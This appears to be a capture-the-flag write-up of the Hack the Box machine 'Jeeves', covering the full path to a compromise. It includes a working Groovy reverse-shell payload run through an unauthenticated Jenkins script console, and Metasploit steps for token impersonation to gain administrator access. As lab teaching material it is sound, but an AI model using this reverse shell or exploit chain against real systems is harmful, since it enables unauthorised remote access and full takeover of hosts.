# Overview
Jeeves is a vulnerable machine from [Hack the Box](https://www.hackthebox.com) that requires some basic enumeration and directory fuzzing. The foothold is accomplished after some enumeration of web pages and gaining access to the Jenkins login, and the privilege escalation is done with token impersonation similar to the Alfred box on [TryHackMe](https://tryhackme.com).

## Nmap Scan
sudo nmap -Pn -sS `10.10.10.63` -vvv

* 80/tcp    open  http         syn-ack
* 135/tcp   open  msrpc        syn-ack
* 445/tcp   open  microsoft-ds syn-ack
* 50000/tcp open  ibm-db2      syn-ack | http-title: Ask Jeeves

## Basic Enumeration
After exploring the web page on port 80, we just get an image on the page. Not really a major bit of information, but it does give us some data that we can still take note of for later on:

* Microsoft SQL server 2005 on the backend
* https://eclipse.dev/jetty/
    * Jetty has a vulnerability: Information Disclosure | java/webapps/50438.txt

Port 50000 is the port for us to look through. Smbclient enumeration on port 445 didn't yield anything for us. 

* Using a directory fuzzer, we find the `askjeeves` directory. We have direct access without logging in.
    * http://10.10.10.63:50000/askjeeves/
    * Jenkins version 2.87 running.
    * Without having to log in, we are able to find a script console.
    * We can pass groovy script to execute code/commands.

## Foothold
[Documentation on Groovy Scripts](https://www.jenkins.io/doc/book/managing/script-console/#:~:text=Jenkins%20features%20a%20Groovy%20script,integrity%20of%20your%20Jenkins%20installation)

We can find and use a reverse shell for groovy script, and get a connection back on our machine with `nc`.

```java
String host="10.10.16.3";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
We get a shell back on this, and are user `jeeves\kohsuke`. We can access `user.txt`.

## Local Enumeration
Checking the users on the host, the only other user than jeeves is `Administrator`.

* We can find what privileges we have using `whoami/priv`:
```
SeShutdownPrivilege | Shut down the system | Disabled
SeChangeNotifyPrivilege | Bypass traverse checking | Enabled
SeUndockPrivilege | Remove computer from docking station | Disabled
SeImpersonatePrivilege | Impersonate client after authentication | Enabled
SeCreateGlobalPrivilege | Create global objects | Enabled
SeIncreaseWorkingSetPrivilege | Increase a process working set | Disabled
SeTimeZonePrivilege | Change the time zone | Disabled
```

* We run systeminfo on the current shell, and copy the output to a file. On kali, we can run `Windows Exploit Suggester` to get some potential path's to escalate privileges. 
* If we get a meterpreter shell on the host as well, we can do the same thing through `msfconsole`.

## Privilege Escalation
Bring up the msfconsole.
* use exploit(multi/script/web_delivery)
* when in the meterpreter shell, run `post/multi/recon/local_exploit_suggester`
* use `exploit/windows/local/ms16_075_reflection_juicy`
    * Load incognito, then we can list out tokens.
    * `list_tokens -u, -g`
    * The user token didn't work for us, but the group token seems to work. 
* We were able to impersonate the `BUILTIN\Administrators` group. 

Looking at the `Administrators Desktop`, the file we see is `hm.txt`. When we read it, it tells us to dig more basically. 

* We can read alternative data streams, by running `dir /R`, we can see the other data stream [Malware Bytes Blog](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/). 
* We run this, and we can finally read the file: `more < hm.txt:root.txt:$DATA`
